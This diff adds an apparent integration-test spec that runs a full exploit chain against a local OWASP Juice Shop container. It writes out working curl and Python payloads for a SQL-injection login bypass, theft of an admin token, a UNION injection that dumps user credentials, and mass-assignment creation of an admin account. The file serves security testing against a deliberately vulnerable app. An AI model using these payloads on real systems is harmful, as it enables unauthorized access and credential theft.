@@ -1,0 +1,106 @@
+name: juiceshop-full-exploit-chain
+description: >
+  Full end-to-end exploit chain against OWASP Juice Shop. Proves every step:
+  1. Fingerprint: identify Node.js/Express service
+  2. Detect: find missing headers, exposed API docs
+  3. Exploit SQLi: bypass auth via login injection, extract admin JWT
+  4. Post-exploit: use stolen token to enumerate users
+  5. Exploit SQLi: UNION injection on search to dump credentials
+  6. Mass assignment: register as admin via role injection
+  All against a real vulnerable app we didn't write.
+tags: [juiceshop, full-chain, sqli, exploit, postexploit, real-vuln, integration]
+
+services:
+  juiceshop:
+    image: bkimminich/juice-shop:latest
+    ports: ["19995:3000"]
+    environment:
+      NODE_ENV: unsafe
+
+ready:
+  cmd: "curl -sf http://localhost:19995/rest/admin/application-version 2>/dev/null | grep -q version"
+  timeout: 120s
+  interval: 5s
+
+assertions:
+  # ══════════════════════════════════════════════════════════════════════
+  # STEP 1: FINGERPRINT — identify the service
+  # ══════════════════════════════════════════════════════════════════════
+
+  - name: fingerprint-service
+    type: beacon
+    target: localhost:19995
+    args: ["--no-enrich", "--no-nmap", "--scanners", "portscan"]
+    expect:
+      check_id: port.service_identified
+
+  # ══════════════════════════════════════════════════════════════════════
+  # STEP 2: DETECT — find security issues
+  # ══════════════════════════════════════════════════════════════════════
+
+  - name: detect-missing-hsts
+    type: beacon
+    target: localhost:19995
+    args: ["--no-enrich", "--no-nmap", "--scanners", "secheaders"]
+    expect:
+      check_id: headers.missing_hsts
+
+  # ══════════════════════════════════════════════════════════════════════
+  # STEP 3: EXPLOIT — SQLi auth bypass on login
+  # ══════════════════════════════════════════════════════════════════════
+
+  # Pre-flight: normal login fails
+  - name: preflight-normal-login-fails
+    type: command
+    expect:
+      command: "curl -s -o /dev/null -w '%{http_code}' -X POST http://localhost:19995/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"nobody@x.com\",\"password\":\"wrong\"}' | grep -q '401'"
+      exit_code: 0
+
+  # Exploit: SQLi bypasses auth and returns admin JWT
+  - name: exploit-sqli-auth-bypass
+    type: command
+    expect:
+      command: "curl -s -X POST http://localhost:19995/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"'\\'' or 1=1--\",\"password\":\"x\"}' | python3 -c \"import sys,json; d=json.load(sys.stdin); assert 'token' in d.get('authentication',{}), 'no token'; print('ADMIN TOKEN:', d['authentication']['token'][:30]+'...')\""
+      exit_code: 0
+
+  # ══════════════════════════════════════════════════════════════════════
+  # STEP 4: POST-EXPLOIT — use stolen token to enumerate users
+  # ══════════════════════════════════════════════════════════════════════
+
+  - name: postexploit-enumerate-users
+    type: command
+    expect:
+      command: "python3 -c \"import urllib.request,json; req=urllib.request.Request('http://localhost:19995/rest/user/login',data=json.dumps({'email':chr(39)+' or 1=1--','password':'x'}).encode(),headers={'Content-Type':'application/json'}); token=json.loads(urllib.request.urlopen(req).read())['authentication']['token']; req2=urllib.request.Request('http://localhost:19995/api/Users/',headers={'Authorization':'Bearer '+token}); users=json.loads(urllib.request.urlopen(req2).read())['data']; print(len(users),'users found'); assert len(users)>=2\""
+      exit_code: 0
+
+  # ══════════════════════════════════════════════════════════════════════
+  # STEP 5: EXPLOIT — UNION SQLi on search dumps user credentials
+  # ══════════════════════════════════════════════════════════════════════
+
+  - name: exploit-union-sqli-dumps-creds
+    type: command
+    expect:
+      command: "curl -s 'http://localhost:19995/rest/products/search?q=xyzzy%27))%20UNION%20SELECT%20id,email,password,%274%27,%275%27,%276%27,%277%27,%278%27,%279%27%20FROM%20Users--' | python3 -c \"import sys,json; d=json.load(sys.stdin)['data']; emails=[x['name'] for x in d if '@' in str(x.get('name',''))]; print(len(emails), 'user emails extracted'); assert len(emails)>=1, 'expected to extract user emails via UNION SQLi'\""
+      exit_code: 0
+
+  # ══════════════════════════════════════════════════════════════════════
+  # STEP 6: EXPLOIT — mass assignment creates admin account
+  # ══════════════════════════════════════════════════════════════════════
+
+  - name: exploit-mass-assignment-admin
+    type: command
+    expect:
+      command: "curl -s -X POST http://localhost:19995/api/Users/ -H 'Content-Type: application/json' -d '{\"email\":\"evil@attacker.com\",\"password\":\"Admin123!\",\"passwordRepeat\":\"Admin123!\",\"role\":\"admin\",\"securityQuestion\":{\"id\":1,\"question\":\"test\"},\"securityAnswer\":\"test\"}' | python3 -c \"import sys,json; d=json.load(sys.stdin); role=d.get('data',{}).get('role',''); print('created user with role:', role); assert role=='admin', f'expected admin role, got {role}'\""
+      exit_code: 0
+
+  # ══════════════════════════════════════════════════════════════════════
+  # NEGATIVE: search with safe input returns normal products
+  # ══════════════════════════════════════════════════════════════════════
+
+  - name: negative-safe-search-normal
+    type: command
+    expect:
+      command: "curl -sf 'http://localhost:19995/rest/products/search?q=apple' | python3 -c \"import sys,json; d=json.load(sys.stdin)['data']; assert all('@' not in str(x.get('name','')) for x in d), 'safe search should not return user emails'\""
+      exit_code: 0
+
+timeout: 10m
